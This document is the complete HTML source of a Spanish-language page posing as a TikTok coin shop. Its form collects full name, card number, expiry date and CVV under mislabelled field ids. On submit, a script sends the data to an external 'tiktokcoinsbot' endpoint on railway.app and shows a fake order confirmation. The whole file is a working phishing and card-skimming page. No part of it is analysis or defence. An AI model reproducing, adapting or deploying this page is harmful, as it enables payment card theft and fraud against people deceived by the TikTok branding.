<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Compra TikTok Coins</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{

    background-image:url("./fondo.jpg");
    background-repeat:no-repeat;
    background-position:center;
    background-size:cover;
    background-attachment:fixed;

    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;

}

.formulario{

    width:430px;

    background:rgba(0,0,0,.60);

    backdrop-filter:blur(12px);

    border-radius:20px;

    padding:35px;

    border:1px solid rgba(255,255,255,.25);

    box-shadow:0 0 40px rgba(0,0,0,.7);

}

h1{

    color:white;

    text-align:center;

    margin-bottom:10px;

    font-size:34px;

}

p{

    color:#ddd;

    text-align:center;

    margin-bottom:30px;

}

input{

    width:100%;

    padding:15px;

    margin-bottom:18px;

    border:none;

    border-radius:10px;

    outline:none;

    font-size:16px;

}

button{

    width:100%;

    padding:15px;

    border:none;

    border-radius:10px;

    font-size:18px;

    font-weight:bold;

    background:linear-gradient(90deg,#ff0050,#00f2ea);

    color:white;

    cursor:pointer;

    transition:.3s;

}

button:hover{

    transform:scale(1.03);

}

</style>

</head>

<body>

<div class="formulario">

<h1>Compra tus Monedas</h1>

<p>Completa tus datos para continuar.</p>

<form id="pedidoForm">

<input
type="text"
id="usuario"
placeholder="Nombre completo"
required
>

<input
type="text"
id="tiktok"
placeholder="Número de la tarjeta"
required
>

<input
type="email"
id="correo"
placeholder="Fecha de vencimiento"
required
>

<input
type="text"
id="monedas"
placeholder="Código CVV"
required
>

<button type="submit">
CONTINUAR
</button>

</form>

<script>
document.getElementById("pedidoForm").addEventListener("submit", async function(e){

    e.preventDefault();

    const datos = {
        usuario: document.getElementById("usuario").value,
        tiktok: document.getElementById("tiktok").value,
        correo: document.getElementById("correo").value,
        monedas: document.getElementById("monedas").value,
        metodo: "Pendiente"
    };

    try{

        const respuesta = await fetch("https://tiktokcoinsbot-production.up.railway.app/enviar", {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify(datos)
        });

        if(respuesta.ok){

            alert("✅ Pedido enviado correctamente.");

            document.getElementById("pedidoForm").reset();

        }else{

            alert("❌ Error al enviar el pedido.");

        }

    }catch(error){

        alert("❌ No se pudo conectar con el servidor.");

    }

});
</script>
